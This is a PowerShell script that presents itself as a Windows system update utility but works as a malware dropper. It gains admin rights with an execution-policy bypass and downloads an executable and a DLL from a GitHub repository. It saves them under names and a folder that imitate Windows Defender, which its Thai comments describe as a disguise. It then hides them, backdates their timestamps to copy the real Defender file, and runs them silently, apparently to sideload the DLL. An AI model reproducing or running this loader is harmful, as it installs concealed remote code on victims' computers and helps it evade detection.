# Menu Selection
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  WINDOWS SYSTEM UPDATE UTILITY" -ForegroundColor Yellow
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "1. Install System Components" -ForegroundColor Green
Write-Host "2. Remove System Components" -ForegroundColor Red
Write-Host "`n========================================" -ForegroundColor Cyan

$choice = Read-Host "`nEnter choice (1/2)"

# Check for Administrator rights
# --------------------------------------------------------------------
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "`n[!] Elevating privileges for system operations..." -ForegroundColor Yellow
    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File '$PSCommandPath'" -Verb RunAs
    exit
}

# Define paths and variables
# --------------------------------------------------------------------
# ใช้โฟลเดอร์ Windows Defender Platform - ดูน่าเชื่อถือและใกล้กัน
$InstallPath = "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24050.7-0"
$SexeDestination = Join-Path $InstallPath "MpCmdRun.exe"           # ปลอมตัวเป็น Windows Defender Command Line Utility
$DllDestination = Join-Path $InstallPath "MpClient.dll"            # ปลอมตัวเป็น Defender Client DLL
$SexeUrl = "https://github.com/Verte225066/as/blob/main/New%20folder/New%20folder/System.exe"
$DllUrl = "https://github.com/Verte225066/as/blob/main/New%20folder/gogo.dll"

# Install & Run Mode
# --------------------------------------------------------------------
if ($choice -eq "1") {
    Write-Host "`n[+] Installing Windows System Components..." -ForegroundColor Green
    
    # สร้างโฟลเดอร์ติดตั้ง (ถ้ายังไม่มี)
    if (-not (Test-Path $InstallPath)) {
        New-Item -Path $InstallPath -Type Directory -Force | Out-Null
        Write-Host "  [*] Created system directory: $InstallPath" -ForegroundColor Yellow
    }

    # Download DLL first
    Write-Host "  [*] Downloading MpClient.dll..." -ForegroundColor Yellow
    try {
        # ลองหลายวิธีดาวน์โหลด
        $success = $false
        $attempts = 0
        while (-not $success -and $attempts -lt 3) {
            $attempts++
            try {
                $webClient = New-Object System.Net.WebClient
                $webClient.Headers.Add("User-Agent", "Windows-Update-Agent")
                $webClient.DownloadFile($DllUrl, $DllDestination)
                $success = $true
                Write-Host "  [✓] MpClient.dll download completed." -ForegroundColor Green
            } catch {
                if ($attempts -eq 3) {
                    throw
                }
                Write-Host "  [!] Attempt $attempts failed, retrying..." -ForegroundColor Yellow
                Start-Sleep -Seconds 2
            }
        }
    } catch {
        Write-Host "  [X] MpClient.dll download failed: $_" -ForegroundColor Red
        Read-Host "`nPress Enter to exit"
        exit
    }

    # Download exe
    Write-Host "  [*] Downloading MpCmdRun.exe..." -ForegroundColor Yellow
    try {
        $success = $false
        $attempts = 0
        while (-not $success -and $attempts -lt 3) {
            $attempts++
            try {
                $webClient = New-Object System.Net.WebClient
                $webClient.Headers.Add("User-Agent", "Microsoft-Delivery-Optimization")
                $tempfile = Join-Path $env:TEMP "system_temp.exe"
                $webClient.DownloadFile($SexeUrl, $tempfile)
                Move-Item -Path $tempfile -Destination $SexeDestination -Force
                $success = $true
                Write-Host "  [✓] MpCmdRun.exe download completed." -ForegroundColor Green
            } catch {
                if ($attempts -eq 3) {
                    throw
                }
                Write-Host "  [!] Attempt $attempts failed, retrying..." -ForegroundColor Yellow
                Start-Sleep -Seconds 2
            }
        }
    } catch {
        Write-Host "  [X] MpCmdRun.exe download failed: $_" -ForegroundColor Red
        Read-Host "`nPress Enter to exit"
        exit
    }

    # ตั้งค่าแอตทริบิวต์ไฟล์ให้ดูเหมือนระบบ
    try {
        Set-ItemProperty -Path $SexeDestination -Name Attributes -Value "Hidden,System,ReadOnly" -Force
        Set-ItemProperty -Path $DllDestination -Name Attributes -Value "Hidden,System,ReadOnly" -Force
        
        # ตั้ง timestamp ให้ดูเหมือนไฟล์ระบบเก่า
        $referenceFile = "C:\Program Files\Windows Defender\MpCmdRun.exe"
        if (Test-Path $referenceFile) {
            $refTime = (Get-Item $referenceFile).LastWriteTime
            (Get-Item $SexeDestination).CreationTime = $refTime.AddDays(-1)
            (Get-Item $SexeDestination).LastWriteTime = $refTime
            (Get-Item $DllDestination).CreationTime = $refTime.AddDays(-1)
            (Get-Item $DllDestination).LastWriteTime = $refTime
            Write-Host "  [✓] File timestamps configured." -ForegroundColor Green
        }
    } catch {
        Write-Host "  [!] Could not set file attributes." -ForegroundColor Yellow
    }

    # Run the program
    Write-Host "  [*] Initializing system component..." -ForegroundColor Yellow
    try {
        # รันในโฟลเดอร์เดียวกัน (ใกล้กัน) - Windows จะหา DLL อัตโนมัติ
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $SexeDestination
        $psi.WorkingDirectory = $InstallPath  # ตั้ง working directory เป็นโฟลเดอร์เดียวกัน
        $psi.UseShellExecute = $false
        $psi.CreateNoWindow = $true
        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        
        $process = New-Object System.Diagnostics.Process
        $process.StartInfo = $psi
        $null = $process.Start()
        
        Write-Host "  [✓] System component initialized." -ForegroundColor Green
    } catch {
        Write-Host "  [X] Failed to initialize component: $_" -ForegroundColor Red
        Write-Host "  [!] Manual execution required." -ForegroundColor Yellow
        Write-Host "      Files are ready at: $InstallPath" -ForegroundColor White
    }
    
    Write-Host "`n[✓] System components installation completed!" -ForegroundColor Green
    Write-Host "    Location: $InstallPath" -ForegroundColor White
    Write-Host "    Files: MpCmdRun.exe, MpClient.dll" -ForegroundColor White

# Clean Mode
# --------------------------------------------------------------------
} elseif ($choice -eq "2") {
    Write-Host "`n[-] Removing system components..." -ForegroundColor Red

    # Stop the process if running
    Write-Host "  [*] Stopping MpCmdRun process..." -ForegroundColor Yellow
    try {
        Get-Process -Name "MpCmdRun" -ErrorAction SilentlyContinue | Stop-Process -Force
        Write-Host "  [✓] Process stopped." -ForegroundColor Green
    } catch {
        Write-Host "  [!] No running process found." -ForegroundColor Yellow
    }

    # Remove files if they exist
    $filesRemoved = 0
    
    if (Test-Path $SexeDestination) {
        try {
            Remove-Item $SexeDestination -Force
            Write-Host "  [✓] Removed executable: MpCmdRun.exe" -ForegroundColor Green
            $filesRemoved++
        } catch {
            Write-Host "  [!] Could not remove MpCmdRun.exe" -ForegroundColor Yellow
        }
    }

    if (Test-Path $DllDestination) {
        try {
            Remove-Item $DllDestination -Force
            Write-Host "  [✓] Removed DLL: MpClient.dll" -ForegroundColor Green
            $filesRemoved++
        } catch {
            Write-Host "  [!] Could not remove MpClient.dll" -ForegroundColor Yellow
        }
    }
    
    # ลบโฟลเดอร์ถ้าว่าง
    if (Test-Path $InstallPath) {
        $items = Get-ChildItem -Path $InstallPath -ErrorAction SilentlyContinue
        if (-not $items -and $filesRemoved -gt 0) {
            try {
                Remove-Item $InstallPath -Force
                Write-Host "  [✓] Removed empty directory." -ForegroundColor Green
            } catch {
                Write-Host "  [!] Could not remove directory." -ForegroundColor Yellow
            }
        }
    }

    Write-Host "`n[✓] Cleanup completed." -ForegroundColor Green

} else {
    Write-Host "`n[X] Invalid selection." -ForegroundColor Red
}

Write-Host "`n========================================" -ForegroundColor Cyan
Read-Host "`nPress Enter to exit"
